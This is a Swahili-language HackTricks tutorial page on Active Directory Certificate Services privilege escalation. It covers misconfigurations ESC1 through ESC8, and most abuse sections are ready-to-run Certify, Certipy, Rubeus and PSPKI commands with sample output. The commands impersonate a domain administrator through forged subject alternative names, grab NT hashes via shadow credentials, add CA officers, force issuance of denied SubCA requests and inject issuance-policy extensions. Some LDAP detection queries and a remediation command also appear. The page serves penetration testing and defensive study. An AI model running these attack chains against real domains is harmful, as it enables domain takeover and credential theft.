# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Huu ni muhtasari wa sehemu za mbinu za kuongezeka zilizomo katika machapisho:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Imeelezwa

- **Haki za usajili zinatolewa kwa watumiaji wenye ruhusa ndogo na Enterprise CA.**
- **Idhini ya meneja haitegemewi.**
- **Hakuna saini kutoka kwa watendaji walioidhinishwa zinazohitajika.**
- **Maelezo ya usalama kwenye template za cheti ni yanayoruhusu kupita kiasi, kuruhusu watumiaji wenye ruhusa ndogo kupata haki za usajili.**
- **Template za cheti zimeundwa ili kubainisha EKU zinazorahisisha uthibitisho:**
- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **Uwezo wa waombaji kujumuisha subjectAltName katika Certificate Signing Request (CSR) unaruhusiwa na template:**
- Active Directory (AD) inatilia umuhimu subjectAltName (SAN) iliyomo kwenye cheti kwa ajili ya uthibitisho wa utambulisho ikiwa ipo. Hii ina maana kwamba kwa kubainisha SAN katika CSR, cheti kinaweza kuombwa ili kujifanya mtumiaji yeyote (kwa mfano, domain administrator). Iwapo SAN inaweza kubainishwa na muombaji inaonyeshwa katika kitu cha template cha cheti katika AD kupitia mali `mspki-certificate-name-flag`. Mali hii ni bitmask, na uwepo wa flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unaruhusu muombaji kubainisha SAN.

> [!CAUTION]
> Muundo uliotajwa unaruhusu watumiaji wenye ruhusa ndogo kuomba vyeti na SAN yoyote walayopendelea, hivyo kuwezesha authentication kama domain principal yeyote kupitia Kerberos au SChannel.

Kipengele hiki wakati mwingine huwezeshwa ili kusaidia uzalishaji wa haraka wa vyeti vya HTTPS au vya mwenyeji na bidhaa au huduma za deployment, au kutokana na kukosekana kwa uelewa.

Inabainika kwamba kuunda cheti kwa chaguo hili kunatoa onyo, jambo ambalo halitokei wakati template ya cheti iliyopo (kama template ya `WebServer`, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imewezeshwa) inakapopiwa nakala (duplicated) na kisha kubadilishwa ili kujumuisha authentication OID.

### Matumizi mabaya

Ili **kutafuta template za cheti zilizo hatarini** unaweza kutekeleza:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Ili **kutumia vibaya udhaifu huu kuiga msimamizi**, mtu angeweza kuendesha:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha **cheti kilichotengenezwa kuwa `.pfx`** kwa muundo na kuitumia tena ili **kujitambulisha kwa kutumia Rubeus au certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binary za Windows "Certreq.exe" & "Certutil.exe" zinaweza kutumika kuunda PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Kuorodhesha template za cheti ndani ya configuration schema ya AD Forest, hasa zile ambazo hazihitaji idhini au saini, zenye Client Authentication au Smart Card Logon EKU, na zenye flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imewezeshwa, inaweza kufanywa kwa kukimbiza query ifuatayo ya LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

Senario ya pili ya matumizi mabaya ni tofautisho la ile ya kwanza:

1. Haki za enrollment zinatolewa kwa watumiaji wenye ruhusa ndogo na Enterprise CA.
2. Mahitaji ya idhini ya meneja yamezimitwa.
3. Hitaji la saini zilizoidhinishwa limeachwa nje.
4. Maelezo ya usalama (security descriptor) yenye ruhusa nyingi kwenye template ya cheti inawapa watumiaji wenye ruhusa ndogo haki za ku-enroll vyeti.
5. **Template ya cheti imefafanuliwa kujumuisha the Any Purpose EKU au kutokuwa na EKU.**

The **Any Purpose EKU** inaruhusu mshambuliaji kupata cheti kwa **madhumuni yoyote**, ikiwa ni pamoja na client authentication, server authentication, code signing, n.k. Mbinu ile ile inayotumika kwa ESC3 inaweza kutumika ku-exploit senario hii.

Vyeti bila **EKUs**, vinavyofanya kazi kama subordinate CA certificates, vinaweza kutumika kwa **madhumuni yoyote** na pia vinaweza **kutumika kusaini vyeti vipya**. Kwa hivyo, mshambuliaji anaweza kubainisha EKUs au mashamba mengine kwa hiari katika vyeti vipya kwa kutumia subordinate CA certificate.

Hata hivyo, vyeti vipya vilivyotengenezwa kwa ajili ya **domain authentication** havitafanya kazi ikiwa subordinate CA haitumiki na kitu cha **`NTAuthCertificates`**, ambacho ndilo mpangilio wa chaguo-msingi. Hata hivyo, mshambuliaji bado anaweza kuunda **vyeti vipya vyenye EKU yoyote** na thamani za cheti za kukusudia kwa hiari. Hivi vinaweza kutumiwa vibaya kwa madhumuni mbalimbali (mf., code signing, server authentication, nk.) na vinaweza kuwa na matokeo makubwa kwa programu nyingine katika mtandao kama SAML, AD FS, au IPSec.

Ili kuorodhesha templates zinazolingana na senario hii ndani ya schema ya usanidi ya AD Forest, query ya LDAP ifuatayo inaweza kuendeshwa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Templates za Enrolment Agent Zilizopangwa Vibaya - ESC3

### Maelezo

Mfano huu ni kama ule wa kwanza na wa pili lakini **kutumia vibaya** **EKU tofauti** (Certificate Request Agent) na **templeti 2 tofauti** (kwa hivyo ina seti 2 za mahitaji),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, inampa principal uwezo wa **kuomba** **certificate** kwa **niaba ya mtumiaji mwingine**.

The **“enrollment agent”** inasajiliwa katika templeti kama hiyo na inatumia certificate iliyopatikana **kusaini pamoja (co-sign) CSR kwa niaba ya mtumiaji mwingine**. Kisha **inatuma** **co-signed CSR** kwa CA, ikijisajili katika templeti inayoruhusu **“enroll on behalf of”**, na CA inajibu kwa kutoa **certificate** inayomilikiwa na mtumiaji **“mwingine”**.

**Requirements 1:**

- Haki za enrollment zinatolewa kwa watumiaji wenye vibali vya chini na Enterprise CA.
- Sharti la idhini ya meneja limeachwa nje.
- Hakuna sharti la saini zilizoidhinishwa.
- Security descriptor ya template ya certificate ni yenye ruhusa kupita kiasi, ikitoa haki za enrollment kwa watumiaji wenye vibali vya chini.
- Template ya certificate ina Certificate Request Agent EKU, ikiruhusu kuomba templeti nyingine za certificate kwa niaba ya principals wengine.

**Requirements 2:**

- Enterprise CA inatoa haki za enrollment kwa watumiaji wenye vibali vya chini.
- Idhini ya meneja inapuuzwa.
- Toleo la schema la templeti ni 1 au lina zaidi ya 2, na linaeleza Application Policy Issuance Requirement inayohitaji Certificate Request Agent EKU.
- EKU iliyotajwa katika templeti ya certificate inaruhusu domain authentication.
- Vizuizi dhidi ya enrollment agents havitekelezwi kwenye CA.

### Abuse

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutumia vibaya tukio hili:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Watumiaji walio na ruhusa kupata cheti cha **enrollment agent**, templates ambazo **agents** wa enrollment wanaruhusiwa kujiandikisha, na **akaunti** ambazo agent wa enrollment anaweza kutenda kwa niaba yao vinaweza kuzuiwa na CAs za shirika. Hii inafanywa kwa kufungua `certsrc.msc` **snap-in**, **kubofya kulia kwenye CA**, **kubofya Properties**, kisha **kuvinjari** hadi kwenye tab ya “Enrollment Agents”.

Hata hivyo, imetambuliwa kwamba mpangilio wa chaguo-msingi kwa CAs ni “**Do not restrict enrollment agents**.” Wakati marufuku kwa enrollment agents inapoamilishwa na wasimamizi kwa kuweka “**Restrict enrollment agents**,” usanidi wa chaguo-msingi unabaki kuwa wa kuruhusu mengi. Unawaruhusu **Everyone** kujiandikisha kwenye templates zote kama mtu yeyote.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**Security descriptor** juu ya **certificate templates** inaelezea **permissions** ambazo **AD principals** maalum wanazo kuhusu template.

Iwapo **mshambulizi** atakuwa na **permissions** zinazohitajika **kubadilisha** **template** na **kuanzisha** **mipangilio isiyo sahihi inayoweza kutumiwa** zilizotajwa katika **sehemu zilizotangulia**, inaweza kuwezesha kuinua haki/mamlaka.

Haki muhimu zinazohusiana na template za cheti ni pamoja na:

- **Owner:** Inatoa udhibiti wa msingi juu ya kitu hicho, ikiruhusu mabadiliko ya sifa yoyote.
- **FullControl:** Inatoa mamlaka kamili juu ya kitu hicho, ikiwa ni pamoja na uwezo wa kubadilisha sifa yoyote.
- **WriteOwner:** Inaruhusu kubadilisha mwenye umiliki wa kitu hicho kuwa kwa principal aliye chini ya udhibiti wa mshambulizi.
- **WriteDacl:** Inaruhusu kurekebisha udhibiti wa upatikanaji (DACL), na hivyo inaweza kumpa mshambulizi FullControl.
- **WriteProperty:** Inaruhusu kuhariri mali yoyote ya kitu hicho.

### Abuse

Ili kubaini principals walio na haki za kuhariri kwenye templates na vitu vingine vya PKI, orodhesha kwa kutumia Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Mfano wa privesc kama ule uliotangulia:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ni pale mtumiaji anapokuwa na ruhusa za kuandika kwenye kiolezo cha cheti. Hii kwa mfano inaweza kutumika kuandika juu (overwrite) usanidi wa kiolezo cha cheti ili kufanya kiolezo kuwa dhaifu kwa ESC1.

Kama tunaona katika njia hapo juu, ni `JOHNPC` pekee anayemiliki ruhusa hizi, lakini mtumiaji wetu `JOHN` ana kiunganisho kipya cha `AddKeyCredentialLink` kwa `JOHNPC`. Kwa kuwa hii technique inahusiana na certificates, nimeitekeleza pia shambulio hili, inayojulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hapa kuna mtazamo mfupi wa amri ya Certipy `shadow auto` ili kupata NT hash ya mwathiriwa.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza overwrite usanidi wa template ya cheti kwa amri moja. Kwa **default**, Certipy itafanya **overwrite** usanidi ili kuufanya **vulnerable to ESC1**. Tunaweza pia kubainisha **`-save-old` parameter ili kuhifadhi usanidi wa zamani**, ambayo itakuwa muhimu kwa **kurejesha** usanidi baada ya shambulio letu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Maelezo

Mtandao mpana wa mahusiano yaliyounganishwa kwa msingi wa ACL, ambao unajumuisha vitu vingi zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vitu hivi, ambavyo vinaweza kuathiri kwa kiasi kikubwa usalama, vinajumuisha:

- AD computer object ya CA server, ambayo inaweza kuathiriwa kupitia taratibu kama S4U2Self au S4U2Proxy.
- RPC/DCOM server ya CA server.
- Kitu chochote kilichomo chini ndani ya container maalum `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini sio tu, containers na vitu kama Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, na Enrollment Services Container.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa mshambuliaji mwenye ruhusa ndogo atasababisha kudhibiti chochote kati ya vipengele hivi muhimu.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada iliyojadiliwa katika [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoainishwa na Microsoft. Mipangilio hii, ikiwashwa kwenye Certification Authority (CA), inaruhusu ujumlishaji wa **user-defined values** katika **subject alternative name** kwa **maombi yoyote**, ikiwa ni pamoja na yale yanayotengenezwa kutoka Active Directory®. Kwa hivyo, kifungu hiki kinawezesha **mdukuzi** kuji-enzela kupitia **template yoyote** iliyosanidiwa kwa ajili ya uthibitishaji wa domain—hasa zile zilizofunguliwa kwa usajili wa watumiaji wasio na ruhusa, kama template ya kawaida ya User. Kwa matokeo, cheti kinaweza kupatikana, kuruhusu mdukuzi kuthibitisha kama domain administrator au **entity nyingine yoyote hai** ndani ya domain.

**Kumbuka**: Njia ya kuongeza **alternative names** ndani ya Certificate Signing Request (CSR), kupitia hoja `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama “Name Value Pairs”), inatofautiana na mkakati wa kuteka SANs katika ESC1. Hapa, utofauti upo katika **jinsi taarifa za akaunti zinavyojahiliwa**—ndani ya attribute ya cheti, badala ya extension.

### Abuse

Ili kuthibitisha kama mipangilio imewezeshwa, mashirika yanaweza kutumia amri ifuatayo kwa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Operesheni hii hasa inatumia **remote registry access**, hivyo njia mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zinaweza kugundua mpangilio huu mbaya na kuutumia:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ili kubadilisha mipangilio hii, ikibidi mtu kuwa na haki za **domain administrative** au sawa, amri ifuatayo inaweza kutekelezwa kutoka kwa workstation yoyote:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ili kuzima usanidi huu katika mazingira yako, flag inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Baada ya masasisho ya usalama ya Mei 2022, **certificates** mpya zitakazotolewa zitakuwa na **security extension** inayojumuisha mali ya `objectSid` ya muombaji. Kwa ESC1, SID hii hutokana na SAN iliyotajwa. Hata hivyo, kwa **ESC6**, SID inafanana na `objectSid` ya muombaji, si SAN.\
> Ili kutekeleza ESC6, ni muhimu mfumo uwe dhaifu kwa ESC10 (Weak Certificate Mappings), ambayo inaipa kipaumbele **SAN juu ya security extension mpya**.

## Vulnerable Certificate Authority Access Control - ESC7

### Shambulio 1

#### Ufafanuzi

Udhibiti wa ufikiaji kwa certificate authority unaendeshwa kupitia seti ya ruhusa zinazodhibiti vitendo vya CA. Ruhusa hizi zinaweza kuonekana kwa kufungua `certsrv.msc`, kubonyeza-kulia CA, kuchagua properties, kisha kuvinjari kwenye Security tab. Zaidi ya hayo, ruhusa zinaweza kuorodheshwa kwa kutumia module ya PSPKI na amri kama:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hili linatoa ufahamu kuhusu haki kuu, yaani **`ManageCA`** na **`ManageCertificates`**, zinazolingana na majukumu ya “CA administrator” na “Certificate Manager” mtawaliwa.

#### Matumizi mabaya

Kuwa na haki za **`ManageCA`** kwenye certificate authority kunamwezesha mhusika kubadilisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kuwasha/kuzima bendera ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu maalumisho ya SAN katika template yoyote, jambo la muhimu kwa kupandisha hadhi kwenye domain.

Kupunguza ugumu wa mchakato huu kunawezekana kwa kutumia cmdlet ya PSPKI **Enable-PolicyModuleFlag**, ikiruhusu mabadiliko bila kuingiliana na GUI moja kwa moja.

Kuwa na haki za **`ManageCertificates`** kunarahisisha kuidhinisha maombi yanayosubiri, kwa ufanisi kukwepa kizuizi cha "CA certificate manager approval".

Mchanganyiko wa moduli za **Certify** na **PSPKI** unaweza kutumika kutuma ombi, kuidhinisha, na kupakua cheti:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Shambulio 2

#### Maelezo

> [!WARNING]
> Katika **shambulio lililotangulia** ruhusa za **`Manage CA`** zilitumika ili **kuwezeshwa** bendera ya **EDITF_ATTRIBUTESUBJECTALTNAME2** kufanya **ESC6 attack**, lakini hii haitakuwa na athari hadi huduma ya CA (`CertSvc`) irejeshwe upya. Mtu anapokuwa na haki ya kufikia `Manage CA`, pia anaruhusiwa **kurejesha huduma**. Hata hivyo, hii **haimaanishi kuwa mtumiaji anaweza kurejesha huduma kwa umbali**. Zaidi ya hayo, **ESC6 might not work out of the box** katika mazingira mengi yaliyopigwa patches kutokana na May 2022 security updates.

Kwa hivyo, shambulio mwingine linaonyeshwa hapa.

Mahitaji ya awali:

- Tu ruhusa ya **`ManageCA`**
- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kutoka **`ManageCA`**)
- Template ya cheti **`SubCA`** lazima iwe **imewezeshwa** (inaweza kuwezeshwa kutoka **`ManageCA`**)

Mbinu inategemea ukweli kwamba watumiaji wenye haki za kufikia `Manage CA` _na_ `Manage Certificates` wanaweza **kuwasilisha maombi ya cheti yaliyokataa**. Template ya cheti ya **`SubCA`** ni **nyeti kwa ESC1**, lakini **wabunifu pekee** wanaweza kujiandikisha kwenye template. Hivyo, **mtumiaji** anaweza **kuomba** kujiandikisha kwa **`SubCA`** - ambalo litatupiliwa mbali - lakini **baadaye litatolewa na msimamizi**.

#### Matumizi mabaya

Unaweza kujipa mwenyewe haki ya kufikia **`Manage Certificates`** kwa kuongeza mtumiaji wako kama afisa mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Kiolezo cha **`SubCA`** kinaweza **kuwezeshwa kwenye CA** kwa kutumia parameter `-enable-template`. Kwa chaguo-msingi, kiolezo cha `SubCA` kimewezeshwa.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumezingatia vigezo vya awali kwa shambulio hili, tunaweza kuanza kwa **kuomba cheti kwa kutumia template ya `SubCA`**.

**Ombi hili litatataliwa**, lakini tutajihifadhi private key na kurekodi request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa ombi la cheti lililoshindikana** kwa kutumia amri `ca` na kipengele `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na hatimaye, tunaweza **kupata cheti kilichotolewa** kwa kutumia amri ya `req` na kipengele `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Shambulio 3 – Manage Certificates Extension Abuse (SetExtension)

#### Maelezo

Mbali na matumizi ya jadi ya ESC7 (kuwezesha sifa za EDITF au kuidhinisha maombi yanayosubiri), **Certify 2.0** ilibaini primitive mpya inayohitaji tu jukumu la *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) kwenye Enterprise CA.

The `ICertAdmin::SetExtension` RPC method inaweza kutekelezwa na yoyote principal anayemiliki *Manage Certificates*. Wakati method kawaida ilitumika na CAs halali kusasisha extensions kwenye maombi **yanayosubiri**, mshambuliaji anaweza kuitapeli ili **kuongeza *non-default* certificate extension** (kwa mfano custom *Certificate Issuance Policy* OID kama `1.1.1.1`) kwenye ombi linalosubiri idhini.

Kwa sababu template inayolengwa haijaweka thamani ya default kwa extension hiyo, CA haitafunika thamani iliyodhibitiwa na mshambuliaji wakati ombi litakapotozwa. Kwa hivyo cheti kilichotolewa kina extension iliyochaguliwa na mshambuliaji ambayo inaweza:

* Kutosheleza masharti ya Application / Issuance Policy ya templates nyingine zilizo hatarini (kunaweza kusababisha privilege escalation).
* Kuingiza EKUs au sera za ziada zinazompa cheti uaminifu usiotarajiwa katika mifumo ya wahusika wa tatu.

Kwa kifupi, *Manage Certificates* – ambayo awali ilichukuliwa kama nusu “isiyo na nguvu” ya ESC7 – sasa inaweza kutumika kwa privilege escalation kamili au persistence ya muda mrefu, bila kugusa usanidi wa CA au kuhitaji haki kali ya *Manage CA*.

#### Kutumia primitive kwa udanganyifu na Certify 2.0

1. **Wasilisha ombi la cheti ambalo litaendelea kuwa *pending*.** Hii inaweza kufanywa kwa template inayohitaji idhini ya meneja:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ongeza extension maalum kwenye ombi linalosubiri** ukitumia amri mpya ya `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*

3. **Toza ombi** (kama jukumu lako pia lina haki za idhini za *Manage Certificates*) au subiri operator kuuliidhinisha. Mara itakapotolewa, pakua cheti:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Cheti kilichopatikana sasa kina malicious issuance-policy OID na kinaweza kutumika katika mashambulio yanayofuata (mfano ESC13, domain escalation, nk).

Kumbuka: Shambulio sawa linaweza kutekelezwa na Certipy ≥ 4.7 kupitia amri ya `ca` na parameter `-set-extension`.

## NTLM Relay kwa AD CS HTTP Endpoints – ESC8

### Maelezo

> [!TIP]
> Katika mazingira ambapo **AD CS imewekwa**, ikiwa kuna **web enrollment endpoint iliyo hatarini** na angalau moja **certificate template imechapishwa** inayoruhusu **domain computer enrollment and client authentication** (kama template ya default **`Machine`**), inawezekana kwa **kompyuta yoyote yenye spooler service ikifanya kazi kuathiriwa na mshambuliaji**!

Njia kadhaa za **HTTP-based enrollment methods** zinatambuliwa na AD CS, zinazoletwa kupitia server roles za ziada ambazo wasimamizi wanaweza kusanidi. Interfaces hizi za HTTP-based certificate enrollment zinaweza kuathiriwa na **NTLM relay attacks**. Mshambuliaji kutoka kwenye **kompyuta iliyodukuliwa, anaweza kujifanya kama akaunti yoyote ya AD inayothibitishwa kupitia inbound NTLM**. Akijifanya kuwa akaunti ya mwathiriwa, interface hizi za wavuti zinaweza kufikiwa na mshambuliaji kuomba cheti cha client authentication kwa kutumia `User` au `Machine` certificate templates.

- The **web enrollment interface** (programu ya zamani ya ASP inayopatikana kwenye `http://<caserver>/certsrv/`), kwa kawaida inatumia tu HTTP, ambayo haitoleti ulinzi dhidi ya NTLM relay attacks. Zaidi ya hayo, inaruhusu wazi tu NTLM kupitia Authorization HTTP header, ikifanya njia za uthibitishaji salama zaidi kama Kerberos zisifae.
- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, na **Network Device Enrollment Service** (NDES) kwa kawaida zinasaidia negotiate authentication kupitia Authorization HTTP header zao. Negotiate authentication **inaunga mkono** Kerberos na **NTLM**, na kuruhusu mshambuliaji **kubana hadi NTLM** wakati wa relay attacks. Ingawa web services hizi zinawezeshwa HTTPS kwa chaguo-msingi, HTTPS peke yake **haitaiweka kinga dhidi ya NTLM relay attacks**. Ulinzi dhidi ya NTLM relay kwa huduma za HTTPS unapatikana csak wakati HTTPS inachanganywa na channel binding. Kwa bahati mbaya, AD CS haitumiwi Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.

Tatizo la kawaida na NTLM relay attacks ni **muda mfupi wa vikao vya NTLM** na kutokuwa na uwezo wa mshambuliaji kuingiliana na huduma zinazohitaji **NTLM signing**.

Hata hivyo, kizuizi hiki kinaweza kushinda kwa kutumia NTLM relay attack kupata cheti kwa mtumiaji, kwani kipindi cha uhalali cha cheti ndicho kinachoamua muda wa kikao, na cheti kinaweza kutumika na huduma zinazohitaji **NTLM signing**. Kwa maelekezo juu ya kutumia cheti kilichoporwa, rejea:

{{#ref}}
account-persistence.md
{{#endref}}

Kizuizi kingine cha NTLM relay attacks ni kwamba **kompyuta inayodhibitiwa na mshambuliaji lazima ithibitishwe nayo na akaunti ya mwathiriwa**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uthibitisho huu:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Matumizi mabaya**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Propati ya `msPKI-Enrollment-Servers` inatumiwa na Certificate Authorities (CAs) za shirika kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchambuliwa na kuorodheshwa kwa kutumia chombo **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
